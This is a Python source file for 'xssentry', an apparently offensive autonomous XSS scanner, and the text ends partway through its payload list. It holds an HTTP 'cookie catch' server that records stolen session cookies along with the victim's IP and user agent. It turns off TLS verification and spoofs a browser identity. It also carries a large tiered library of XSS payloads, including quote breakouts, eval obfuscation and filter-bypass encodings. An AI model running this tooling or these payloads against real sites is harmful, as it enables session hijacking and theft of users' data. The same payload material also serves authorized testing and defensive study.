#!/usr/bin/env python3
"""
---------  ---------------------------------------------------------------------------------------------   --------------------------------------------------------- ---------   ---------
---------------------------------------------------------------------------------------------------------------  ------------------------------------------------------------------------ ------------
 ------------------ ------------------------------------------------------------------  ------------------ ---------   ---------   ------------------------ --------------------- 
 ------------------ ------------------------------------------------------------------  ------------------------------   ---------   ------------------------  ---------------  
------------ ------------------------------------------------------------------------------------------ ------------------   ---------   ---------  ---------   ---------   
---------  ------------------------------------------------------------------------------------------  ---------------   ---------   ---------  ---------   ---------   

  xssentry v4.0 --- Autonomous XSS Hunter  [HELLHOUND-class]
  Detected XSS types: Reflected -- Stored -- DOM -- Mutation(mXSS) -- uXSS -- Blind
  Engines: Reflected -- Stored -- DOM-based -- Mutation(mXSS) -- uXSS -- Blind XSS
  Pipeline:
    1. Threaded crawl (HTML + JS/SPA)    --- endpoint + param discovery
    2. Parallel param discovery          --- error-probe + wordlist fuzz
    3. Risk scoring                      --- high-risk params first
    4. Reflected XSS                     --- inject --- verify in same response
    5. Stored XSS                        --- inject --- visit retrieval URLs --- check
    6. DOM XSS                           --- JS sink analysis + headless probe
    7. Mutation XSS (mXSS)              --- innerHTML mutation bypass payloads
    8. Universal XSS (uXSS)             --- cross-origin protocol vectors
    9. Blind XSS                         --- OOB callback server + out-of-band confirm
   10. Cookie exfil                      --- auto-fire + catch on confirmed XSS

  v3.2 upgrades (HELLHOUND integration):
    -- HELLHOUND label system  (ok/warn/err/info/found/phase/section)
    -- ThreadPoolExecutor crawler  (parallel page + JS processing)
    -- Enhanced JSExtractor  (REST/router/template/WebSocket patterns)
    -- Progress bars during crawl and testing
    -- Thread-safe tprint with _print_lock
    -- Clean status output --- crawling noise suppressed, summaries shown
"""

import argparse
import math
import subprocess
import http.server
import json
import os
import random
import re
import socket
import ssl
import string
import sys
import time
import threading
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from html.parser import HTMLParser
import asyncio
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_INSTALLED = True
except ImportError:
    PLAYWRIGHT_INSTALLED = False

from rich.console import Console, Group
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn, MofNCompleteColumn, ProgressColumn
from rich.rule import Rule
from rich import box
from rich.live import Live
from rich.status import Status
from rich.layout import Layout

console = Console(log_path=False, log_time=False)


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# ANSI COLOR SYSTEM  --- HELLHOUND-style with xssentry gradient palette
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    # Brighter 256-color palette
    NEON_G  = "\033[38;5;82m"   # Neon Green
    NEON_B  = "\033[38;5;45m"   # Electric Blue
    NEON_O  = "\033[38;5;208m"  # Bright Orange
    NEON_P  = "\033[38;5;199m"  # Hot Pink
    NEON_Y  = "\033[38;5;226m"  # Laser Yellow
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    BRED    = "\033[91m"
    BYELLOW = "\033[93m"
    BWHITE  = "\033[97m"
    @staticmethod
    def fg(n): return f"\033[38;5;{n}m"
    @staticmethod
    def bg(n): return f"\033[48;5;{n}m"


# ------ Core color/label primitives  (HELLHOUND-style) ---------------------------------------------------------------------------------
def color(text, style):
    return f"[{style}]{text}[/{style}]"

# ------ Modern Label Primitives (Rich-based) ---------------------------------------------------------------------------------
def label(tag, text, style="cyan"):
    return f"[{style}][{tag}][/{style}] {text}"

def ok(t):       return f"[bold green][+][/bold green] {t}"
def warn(t):     return f"[bold orange3][!][/bold orange3] {t}"
def err(t):      return f"[bold red][-][/bold red] {t}"
def info(t):     return f"[bold cyan][*][/bold cyan] {t}"
def found(t):    return f"[bold green]FOUND[/bold green] {t}"
def js_ep(t):    return f"[bold magenta]JS[/bold magenta] {t}"
def phase(t):    return f"[bold magenta]PHASE[/bold magenta] {t}"
def xss_lbl(t):  return f"[bold red]XSS[/bold red] {t}"
def ck_lbl(t):   return f"[bold orange3]COOKIE[/bold orange3] {t}"
def skp(t):      return f"[dim]SKIP[/dim] {t}"
def hit_lbl(t):  return f"[bold yellow]HIT[/bold yellow] {t}"
def prb_lbl(t):  return f"[bold cyan]FUZZ[/bold cyan] {t}"
def fp_lbl(t):   return f"[dim]FP[/dim] {t}"

# ------ Thread-safe print ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def tprint(*a, **kw):
    console.print(*a, **kw)

def _strip_ansi(s):
    return re.sub(r'\x1b\[[0-9;]*m', '', str(s))


# ------ Section / progress  (Rich-style) ---------------------------------------------------------------------
def section(title):
    console.print()
    console.rule(f"[bold cyan]{title.upper()}[/bold cyan]", style="cyan")
    console.print()

def progress(cur, tot, w=30):
    # This is a fallback for legacy code. New code should use Rich Progress context.
    pct = cur / tot if tot else 0
    return f"{int(pct*100)}%"

def divider(char="-", w=60, col=None):
    return Rule(style="dim")


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# BRAILLE-WAVE PROGRESS BAR  &  CASE-WAVE TEXT ANIMATION
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Braille block characters — each encodes a different dot-fill density,
# creating a smooth left-to-right flowing wave when cycled.
_BRAILLE_WAVE = [
    "⠁", "⠃", "⠇", "⡇", "⣇", "⣧", "⣷", "⣿",
    "⣾", "⣶", "⣦", "⣄", "⡄", "⠄", "⠀", "⠀",
]

class BrailleWaveColumn(ProgressColumn):
    """Rich ProgressColumn — Braille-dot wave for indeterminate,
    Braille-fill ramp for determinate tasks."""

    def render(self, task) -> Text:
        t      = time.time()
        width  = 26
        n      = len(_BRAILLE_WAVE)

        if task.total is None:
            # Indeterminate: flowing Braille wave
            chars = ""
            for i in range(width):
                idx = int((i * 2 - t * 12)) % n
                if idx < 0: idx += n
                chars += _BRAILLE_WAVE[idx]
            return Text(chars, style="bold red")

        # Determinate: filled Braille ramp + empty space
        pct    = task.completed / task.total
        filled = int(pct * width)
        remain = width - filled
        bar    = "⣿" * filled + "⠀" * remain
        return Text(bar, style="bold red")


def case_wave(text: str, frame: float = None) -> Text:
    """Returns a rich Text object with a sinusoidal Case-Wave effect.
    Characters at the wave peak are BOLD CYAN UPPER, descending to dim lower."""
    if frame is None:
        frame = time.time()

    result = Text()
    for i, ch in enumerate(text):
        if ch == " ":
            result.append(" ")
            continue
        # Wave value: -1.0 → +1.0
        val = math.sin(i * 0.45 + frame * 3.5)
        if val > 0.6:
            result.append(ch.upper(), style="bold red")
        elif val > 0.2:
            result.append(ch.upper(), style="red")
        elif val > -0.2:
            result.append(ch,         style="white")
        elif val > -0.6:
            result.append(ch.lower(), style="dim red")
        else:
            result.append(ch.lower(), style="dim")
    return result


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# HUD STATE & LIVE INTERFACE
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class HUDState:
    """Manages global state for the live tactical dashboard."""
    def __init__(self, target):
        self._lock = threading.Lock()
        self.target = target
        self.start_time = datetime.now()
        self.endpoints_total = 0
        self.endpoints_tested = 0
        self.params_total = 0
        self.requests_sent = 0
        self.findings_count = 0
        self.current_action = "Initializing..."
        self.last_finding = None
        self.recent_logs = []
        self.findings_list = []

    def update(self, **kwargs):
        with self._lock:
            for k, v in kwargs.items():
                if hasattr(self, k):
                    setattr(self, k, v)
                elif k == "log":
                    self.recent_logs.append(v)
                    if len(self.recent_logs) > 8: self.recent_logs.pop(0)

    def add_finding(self, finding):
        with self._lock:
            self.findings_list.append(finding)
            self.findings_count += 1
            self.last_finding = finding

class CyberTacticalHUD:
    """Constructs the Rich Layout for the live dashboard."""
    def __init__(self, state):
        self.state = state

    def make_layout(self):
        layout = Layout()
        layout.split_column(
            Layout(name="main"),
            Layout(name="footer", size=3)
        )
        layout["main"].split_row(
            Layout(name="left", ratio=1),
            Layout(name="right", ratio=3)
        )
        return layout

    def get_renderable(self):
        layout = self.make_layout()

        eps_total = self.state.endpoints_total or 1
        eps_done  = self.state.endpoints_tested
        pct       = int((eps_done / eps_total) * 100)
        t         = time.time()

        # Braille-Wave mini-bar for the stats panel
        bw_width  = 18
        bw_filled = int((eps_done / eps_total) * bw_width)
        bw_bar    = "⣿" * bw_filled + "⠀" * (bw_width - bw_filled)

        # Case-Wave on the current action status
        status_wave = case_wave(self.state.current_action, frame=t)

        # Left: Stats panel
        stats_table = Table(show_header=False, box=None, padding=(0, 1))
        stats_table.add_row("[bold yellow]Target[/]",   f"[dim]{self.state.target[:35]}[/]")
        stats_table.add_row("[bold yellow]Status[/]",   status_wave)
        stats_table.add_row("[bold yellow]Progress[/]", Text(f"{bw_bar} {pct}%", style="bold red"))
        stats_table.add_row("[bold yellow]Endpoints[/]",f"{eps_done} / {eps_total}")
        stats_table.add_row("[bold yellow]Requests[/]", f"{self.state.requests_sent}")
        stats_table.add_row("[bold red]VULN HITS[/]",   f"[bold red]{self.state.findings_count}[/]")
        layout["left"].update(Panel(stats_table, title="[bold white]X5SENTRY[/]", border_style="yellow"))

        # Right: Live findings feed
        f_table = Table(
            title="[bold red]● LIVE FINDINGS[/]",
            box=box.SIMPLE_HEAVY, expand=True, show_lines=False
        )
        f_table.add_column("Sev",   width=5,  justify="center")
        f_table.add_column("Type",  style="bold magenta", width=12)
        f_table.add_column("Param", style="orange3", width=14)
        f_table.add_column("Score", width=7,  justify="right")
        f_table.add_column("Endpoint", style="white")

        if self.state.findings_list:
            for f in self.state.findings_list[-12:]:
                score = f.get("score", 0)
                sev   = "[bold red]CRIT[/]" if score >= 90 else "[bold red]HIGH[/]" if score >= 70 else "[bold yellow]MED[/]"
                f_table.add_row(
                    sev,
                    f.get("xss_type", "reflected").upper()[:11],
                    f.get("param", "N/A")[:13],
                    f"[bold]{score}%[/]",
                    f.get("url", "N/A")[:55],
                )
        else:
            f_table.add_row("[dim]--[/]", "[dim]Scanning...[/]", "[dim]--[/]", "[dim]--[/]", "[dim]Awaiting results[/]")
        layout["right"].update(Panel(f_table, border_style="red"))

        # Footer: Braille-Wave full-width progress bar
        prog      = eps_done / eps_total
        fw        = 60
        filled    = int(prog * fw)
        prog_bar  = "⣿" * filled + "⠀" * (fw - filled)
        # Animate trailing edge with a wave caret
        n         = len(_BRAILLE_WAVE)
        wave_idx  = int(t * 12) % n
        wave_char = _BRAILLE_WAVE[wave_idx] if filled < fw else "⣿"
        if filled < fw:
            prog_bar = "⣿" * filled + wave_char + "⠀" * max(0, fw - filled - 1)
        footer_text = Text(f"{prog_bar}  {pct}%", style="bold red")
        layout["footer"].update(Panel(
            Align.center(footer_text),
            border_style="dim", title="[dim]AUDIT PROGRESS[/dim]"
        ))

        return layout


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# BANNER
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def print_banner():
    art = r"""
  __  __  ____ ____  _____ _   _ _____ ____  __   __
  \ \/ / / ___/ ___|| ____| \ | |_   _|  _ \ \ \ / /
   \  /  \___ \___ \|  _| |  \| | | | | |_) | \ V / 
   /  \   ___) |__) | |___| |\  | | | |  _ <   | |  
  /_/\_\ |____/____/|_____|_| \_| |_| |_| \_\  |_|  
"""
    console.print("\n")
    console.print(Align.center(Text(art, style="bold white")))
    console.print(Align.center(Text("\u2014  A u t o n o m o u s  X S S  H u n t e r  \u2014", style="dim")))
    console.print("\n")

# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# COOKIE CATCH SERVER
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class CookieCatcher:
    caught = []
    _lock  = threading.Lock()

    def __init__(self, host="0.0.0.0", port=8765):
        self.host = host; self.port = port
        self.server = None; self._thread = None; self.url = None

    @staticmethod
    def _local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def start(self):
        catcher_ref = self
        class _Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                qs     = urllib.parse.parse_qs(parsed.query)
                cookie = qs.get("c", qs.get("cookie", [""]))[0]
                ua     = self.headers.get("User-Agent", "")
                src_ip = self.client_address[0]
                if cookie:
                    entry = {"ip": src_ip, "cookie": cookie, "ua": ua}
                    with CookieCatcher._lock:
                        CookieCatcher.caught.append(entry)
                    tprint(f"\n  {ck_lbl('COOKIE RECEIVED!')}")
                    tprint(f"  {color('  From IP :', C.BYELLOW)} {color(src_ip, C.BWHITE)}")
                    tprint(f"  {color('  Cookie  :', C.BYELLOW)} {color(cookie, C.fg(214))}")
                    tprint(f"  {color('  UA      :', C.DIM)} {color(ua[:80], C.DIM)}\n")
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"ok")
            def log_message(self, *a): pass

        # Try up to 5 ports if the default is busy
        ports_to_try = [self.port] if self.port != 0 else []
        ports_to_try.extend([random.randint(8000, 9000) for _ in range(5)])
        
        for port in ports_to_try:
            try:
                self.server  = http.server.HTTPServer((self.host, port), _Handler)
                self.port    = port
                self.url     = f"http://{self._local_ip()}:{self.port}"
                self._thread = threading.Thread(target=self.server.serve_forever, daemon=True)
                self._thread.start()
                return self.url
            except OSError:
                continue
        
        tprint(f"  {warn(f'Cookie server failed to start (tried ports {ports_to_try})')}")
        return None

    def stop(self):
        if self.server: self.server.shutdown()

    def summary(self): return list(CookieCatcher.caught)


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# SSL + HTTP CLIENT
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
_SSL = ssl.create_default_context()
_SSL.check_hostname = False
_SSL.verify_mode    = ssl.CERT_NONE

_HDR = {
    "User-Agent":      ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/124.0.0.0 Safari/537.36"),
    "Accept":          "text/html,application/xhtml+xml,application/json,*/*;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection":      "close",
}

class HTTPClient:
    def __init__(self, timeout=12): self.timeout = timeout

    def get(self, url, params=None):
        if params:
            qs  = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
            url = url + ("&" if "?" in url else "?") + qs
        return self._do(url, None, "GET", _HDR)

    def post(self, url, data=None):
        if data:
            body = urllib.parse.urlencode(data).encode()
            hdrs = {**_HDR, "Content-Type": "application/x-www-form-urlencoded"}
        else:
            body, hdrs = None, _HDR
        return self._do(url, body, "POST", hdrs)

    def get_raw(self, url): return self._do(url, None, "GET", _HDR)

    def _do(self, url, body, method, hdrs):
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        t0  = time.time()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=_SSL) as r:
                el   = time.time() - t0
                text = r.read(1024 * 1024).decode("utf-8", errors="replace")
                return {"ok": True, "status": r.status, "body": text,
                        "elapsed": el, "url": url, "headers": dict(r.headers), "error": None}
        except urllib.error.HTTPError as e:
            el = time.time() - t0
            try:    text = e.read(512 * 1024).decode("utf-8", errors="replace")
            except: text = ""
            return {"ok": False, "status": e.code, "body": text,
                    "elapsed": el, "url": url, "headers": {}, "error": str(e)}
        except Exception as ex:
            el = time.time() - t0
            return {"ok": False, "status": 0, "body": "",
                    "elapsed": el, "url": url, "headers": {}, "error": str(ex)}


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# COMMON PARAMETER WORDLIST
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
COMMON_PARAMS = [
    "q","s","search","query","term","keyword","keywords","find","text","input",
    "name","title","subject","content","body","message","description","comment",
    "page","p","pg","id","num","index","offset","limit","start","end",
    "next","prev","return","redirect","url","link","href","src","ref",
    "returnUrl","return_url","next_url","goto","go","back",
    "user","username","email","password","pass","pwd","token","key","secret",
    "auth","login","session","access_token","api_key","apikey",
    "output","format","type","view","mode","lang","locale","language",
    "template","theme","style","layout","render","display","show","tab",
    "file","path","dir","folder","doc","document","load","read","include",
    "data","value","val","code","hash","tag","category","cat","filter","sort",
    "order","field","col","size","color","colour",
    "callback","jsonp","action","method","event","ajax",
    "error","msg","debug","note","reason","info","detail","tip","hint",
    "preview","sandbox","test","trace","alert","warn",
]


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# XSS PAYLOAD LIBRARY
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PAYLOADS = [
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # TIER 1 --- raw HTML injection (no context escape needed)
    # Used first: fast signal whether any XSS is possible at all.
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    {"id":"t1_script",        "pl":'<script>alert(1)</script>',                    "tier":1,"type":"html"},
    {"id":"t1_script_sl",     "pl":'<script>alert(1)//',                           "tier":1,"type":"html"},
    {"id":"t1_script_cm",     "pl":'<script>alert(1)<!---',                          "tier":1,"type":"html"},
    {"id":"t1_img",           "pl":'<img src=x onerror=alert(1)>',                 "tier":1,"type":"html"},
    {"id":"t1_img_slash",     "pl":'<img/src=x/onerror=alert(1)>',                 "tier":1,"type":"html"},
    {"id":"t1_img_sp",        "pl":'<img src =q onerror=alert(1)>',                "tier":1,"type":"html"},
    {"id":"t1_img2",          "pl":'<img src/onerror=alert(1)>',                   "tier":1,"type":"html"},
    {"id":"t1_image",         "pl":'<image/src/onerror=alert(1)>',                 "tier":1,"type":"html"},
    {"id":"t1_image2",        "pl":'<image src/onerror=alert(1)>',                 "tier":1,"type":"html"},
    {"id":"t1_image_sp",      "pl":'<image src =q onerror=alert(1)>',              "tier":1,"type":"html"},
    {"id":"t1_svg",           "pl":'<svg onload=alert(1)>',                        "tier":1,"type":"html"},
    {"id":"t1_svg_ns",        "pl":'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>', "tier":1,"type":"html"},
    {"id":"t1_body_load",     "pl":'<body onload=alert(1)>',                       "tier":1,"type":"html"},
    {"id":"t1_body_page",     "pl":'<body onpageshow=alert(1)>',                   "tier":1,"type":"html"},
    {"id":"t1_body_focus",    "pl":'<body onfocus=alert(1)>',                      "tier":1,"type":"html"},
    {"id":"t1_body_err",      "pl":'<body onerror=alert(1) onload=/>',             "tier":1,"type":"html"},
    {"id":"t1_audio_src",     "pl":'<audio src onloadstart=alert(1)>',             "tier":1,"type":"html"},
    {"id":"t1_video",         "pl":'<video onloadstart=alert(1)><source>',         "tier":1,"type":"html"},
    {"id":"t1_marquee",       "pl":'<marquee onstart=alert(1)>',                   "tier":1,"type":"html"},
    {"id":"t1_input_af",      "pl":'<input autofocus onblur=alert(1)>',            "tier":1,"type":"html"},
    {"id":"t1_input_focus",   "pl":'<input autofocus onfocus=alert(1)>',           "tier":1,"type":"html"},

    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # TIER 2 --- attribute/quote breakout
    # For values reflected inside HTML attributes (href, src, value="...", etc.)
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    {"id":"t2_dq_script",     "pl":'"><script>alert(1)</script>',                  "tier":2,"type":"attr"},
    {"id":"t2_sq_script",     "pl":"'><script>alert(1)</script>",                  "tier":2,"type":"attr"},
    {"id":"t2_dq_svg",        "pl":'"><svg onload=alert(1)//',                     "tier":2,"type":"attr"},
    {"id":"t2_dq_img",        "pl":'"><img src=x onerror=alert(1)>',               "tier":2,"type":"attr"},
    {"id":"t2_dq_img_gif",    "pl":'"><img src=1 onerror=alert(1)>.gif',           "tier":2,"type":"attr"},
    {"id":"t2_dq_om",         "pl":'"onmouseover=alert(1)//',                      "tier":2,"type":"attr"},
    {"id":"t2_dq_af",         "pl":'"autofocus/onfocus=alert(1)//',                "tier":2,"type":"attr"},
    {"id":"t2_ev_dq",         "pl":'" onmouseover=alert(1) x="',                  "tier":2,"type":"attr"},
    {"id":"t2_ev_sq",         "pl":"' onfocus=alert(1) autofocus x='",             "tier":2,"type":"attr"},
    # Email-field context (onclick in value that is an email address)
    {"id":"t2_email_click",   "pl":'"onclick=alert(1)>"@x.y',                     "tier":2,"type":"attr"},
    {"id":"t2_email_svg",     "pl":'"onclick=alert(1)><svg/onload=alert(1)>"@x.y', "tier":2,"type":"attr"},
    # Interaction-based attribute events (useful when JS filtering is loose)
    {"id":"t2_x_click",       "pl":'<x onclick=alert(1)>click this!',             "tier":2,"type":"attr"},
    {"id":"t2_x_dblclick",    "pl":'<x ondblclick=alert(1)>double click this!',   "tier":2,"type":"attr"},
    {"id":"t2_x_hover",       "pl":'<x onmouseover=alert(1)>hover this!',         "tier":2,"type":"attr"},
    {"id":"t2_x_mousedown",   "pl":'<x onmousedown=alert(1)>click this!',         "tier":2,"type":"attr"},
    {"id":"t2_x_copy",        "pl":'<x oncopy=alert(1)>copy this!',               "tier":2,"type":"attr"},
    {"id":"t2_x_ctx",         "pl":'<x oncontextmenu=alert(1)>right click this!', "tier":2,"type":"attr"},
    {"id":"t2_x_drag",        "pl":'<x ondrag=alert(1)>drag this!',               "tier":2,"type":"attr"},
    {"id":"t2_x_focus",       "pl":'<x contenteditable onfocus=alert(1)>focus this!', "tier":2,"type":"attr"},
    {"id":"t2_x_input",       "pl":'<x contenteditable oninput=alert(1)>input here!',  "tier":2,"type":"attr"},
    {"id":"t2_x_keydown",     "pl":'<x contenteditable onkeydown=alert(1)>press any key!', "tier":2,"type":"attr"},
    {"id":"t2_x_paste",       "pl":'<x contenteditable onpaste=alert(1)>paste here!',  "tier":2,"type":"attr"},
    {"id":"t2_x_blur",        "pl":'<x contenteditable onblur=alert(1)>lose focus!',   "tier":2,"type":"attr"},
    # Button / form events
    {"id":"t2_btn_click",     "pl":'<button onclick="alert(1)">test</button>',    "tier":2,"type":"attr"},
    {"id":"t2_btn_af",        "pl":'<button autofocus onfocus=alert(1)>test</button>', "tier":2,"type":"attr"},
    {"id":"t2_form_sub",      "pl":'<form onsubmit=alert(1)><input type=submit>',  "tier":2,"type":"attr"},
    {"id":"t2_select",        "pl":'<select onchange=alert(1)><option>1<option>2', "tier":2,"type":"attr"},
    # Anchor / link events
    {"id":"t2_a_click",       "pl":'<a onclick="alert(1)">test</a>',              "tier":2,"type":"attr"},
    {"id":"t2_a_hover",       "pl":'<a onmouseover="alert(1)">test</a>',          "tier":2,"type":"attr"},
    {"id":"t2_a_dbl",         "pl":'<a ondblclick="alert(1)">test</a>',           "tier":2,"type":"attr"},
    # Drag events
    {"id":"t2_a_drag",        "pl":'<a draggable="true" ondrag="alert(1)">test</a>', "tier":2,"type":"attr"},
    {"id":"t2_a_dragstart",   "pl":'<a draggable="true" ondragstart="alert(1)">test</a>', "tier":2,"type":"attr"},

    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # TIER 3 --- JS string/template context breakout
    # For values reflected inside <script> blocks or event handler strings.
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    {"id":"t3_jsdq",          "pl":'";alert(1)//',                                 "tier":3,"type":"js"},
    {"id":"t3_jssq",          "pl":"';alert(1)//",                                 "tier":3,"type":"js"},
    {"id":"t3_jssq2",         "pl":"'-alert(1)-'",                                 "tier":3,"type":"js"},
    {"id":"t3_jsdq2",         "pl":'"-alert(1)-"',                                 "tier":3,"type":"js"},
    {"id":"t3_jssq3",         "pl":"'-alert(1)//",                                 "tier":3,"type":"js"},
    {"id":"t3_jssq_bs",       "pl":"\\'-alert(1)//",                               "tier":3,"type":"js"},
    {"id":"t3_tpl",           "pl":"`${alert(1)}",                                 "tier":3,"type":"js"},
    {"id":"t3_close",         "pl":"</script><svg onload=alert(1)>",               "tier":3,"type":"js"},
    {"id":"t3_close2",        "pl":"</script><script>alert(1)</script>",           "tier":3,"type":"js"},
    {"id":"t3_cmt",           "pl":"*/alert(1)</script><script>/*",                "tier":3,"type":"js"},
    {"id":"t3_cmt2",          "pl":"*/alert(1)\">'onload=\"/*<svg/1='",            "tier":3,"type":"js"},
    {"id":"t3_cmt3",          "pl":"*/alert(1)</script>'>alert(1)/*<script/1='",   "tier":3,"type":"js"},
    {"id":"t3_sq_load",       "pl":"'onload=alert(1)><svg/1='",                    "tier":3,"type":"js"},
    {"id":"t3_sq_close",      "pl":"'>alert(1)</script><script/1='",               "tier":3,"type":"js"},
    {"id":"t3_tpl_load",      "pl":"`-alert(1)\">'onload=\"`<svg/1='",             "tier":3,"type":"js"},
    # eval variants (inline JS execution)
    {"id":"t3_eval_wdq",      "pl":"\"-eval(\"window['pro'%2B'mpt'](8)\")-\"",    "tier":3,"type":"js"},
    {"id":"t3_eval_wsq",      "pl":"'-eval(\"window['pro'%2B'mpt'](8)\")-'",      "tier":3,"type":"js"},
    {"id":"t3_js_assign",     "pl":"';a=prompt,a()//",                             "tier":3,"type":"js"},
    {"id":"t3_js_assign_dq",  "pl":'";a=prompt,a()//',                             "tier":3,"type":"js"},

    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # TIER 4 --- filter bypass (case, entities, whitespace, encoding)
    # For apps with basic XSS filters that block lowercase tags/events.
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # Case mangling
    {"id":"t4_case_script",   "pl":'<ScRiPt>alert(1)</ScRiPt>',                   "tier":4,"type":"html"},
    {"id":"t4_case_X",        "pl":'<X onxxx=1',                                   "tier":4,"type":"html"},
    {"id":"t4_case_OnX",      "pl":'<x OnXxx=1',                                   "tier":4,"type":"html"},
    # HTML entity encoding
    {"id":"t4_svg_ent",       "pl":'<svg/onload=&#x61;lert(1)>',                   "tier":4,"type":"html"},
    {"id":"t4_alert_ent1",    "pl":'alert&lpar;1&rpar;',                            "tier":4,"type":"html"},
    {"id":"t4_alert_ent2",    "pl":'alert&#x28;1&#x29',                             "tier":4,"type":"html"},
    {"id":"t4_alert_ent3",    "pl":'alert&#40;1&#41',                               "tier":4,"type":"html"},
    # No-space tricks
    {"id":"t4_nospace",       "pl":'<img/src=x/onerror=alert(1)>',                 "tier":4,"type":"html"},
    {"id":"t4_slash_sep",     "pl":'<x/onxxx=1',                                   "tier":4,"type":"html"},
    # Whitespace injection (tab, newline, CR, FF)
    {"id":"t4_tab",           "pl":'<img src=x\tonerror=alert(1)>',                "tier":4,"type":"html"},
    {"id":"t4_nl",            "pl":'<img src=x\nonerror=alert(1)>',                "tier":4,"type":"html"},
    {"id":"t4_ws_tab",        "pl":'<x%09onxxx=1',                                 "tier":4,"type":"html"},
    {"id":"t4_ws_nl",         "pl":'<x%0Aonxxx=1',                                 "tier":4,"type":"html"},
    {"id":"t4_ws_ff",         "pl":'<x%0Conxxx=1',                                 "tier":4,"type":"html"},
    {"id":"t4_ws_cr",         "pl":'<x%0Donxxx=1',                                 "tier":4,"type":"html"},
    {"id":"t4_ws_slash",      "pl":'<x%2Fonxxx=1',                                 "tier":4,"type":"html"},
    # Percent-encoding on tag/attr characters
    {"id":"t4_pct_x",         "pl":'%3Cx onxxx=alert(1)',                           "tier":4,"type":"html"},
    {"id":"t4_pct_x2",        "pl":'<%78 onxxx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_pct_on1",       "pl":'<x %6Fnxxx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_pct_on2",       "pl":'<x o%6Exxx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_pct_on3",       "pl":'<x on%78xx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_pct_eq",        "pl":'<x onxxx%3D1',                                  "tier":4,"type":"html"},
    # Quote injection into attribute with fake attr
    {"id":"t4_fake_attr1",    "pl":"<x 1='1'onxxx=1",                               "tier":4,"type":"html"},
    {"id":"t4_fake_attr2",    "pl":'<x 1="1"onxxx=1',                               "tier":4,"type":"html"},
    {"id":"t4_fake_lt",       "pl":'<x </onxxx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_fake_gt",       "pl":'<x 1=">" onxxx=1',                              "tier":4,"type":"html"},
    {"id":"t4_http_ctx",      "pl":'<http://onxxx%3D1/',                             "tier":4,"type":"html"},
    {"id":"t4_squote_end",    "pl":"<x onxxx=alert(1) 1='",                          "tier":4,"type":"html"},
    # Interesting elements
    {"id":"t4_details",       "pl":'<details open ontoggle=alert(1)>',              "tier":4,"type":"html"},
    {"id":"t4_iframe",        "pl":'<iframe srcdoc="<script>alert(1)</script>">',    "tier":4,"type":"html"},
    {"id":"t4_iframe_srcdoc", "pl":'<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>', "tier":4,"type":"html"},
    {"id":"t4_input",         "pl":'<input autofocus onfocus=alert(1)>',             "tier":4,"type":"html"},
    {"id":"t4_keygen",        "pl":'<keygen autofocus onfocus=alert(1)>',            "tier":4,"type":"html"},
    {"id":"t4_marquee2",      "pl":'<marquee loop=1 width=0 onfinish=alert(1)>',     "tier":4,"type":"html"},
    {"id":"t4_body_resize",   "pl":'<body onresize=alert(1)>press F12!',             "tier":4,"type":"html"},
    {"id":"t4_body_scroll",   "pl":'<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x', "tier":4,"type":"html"},
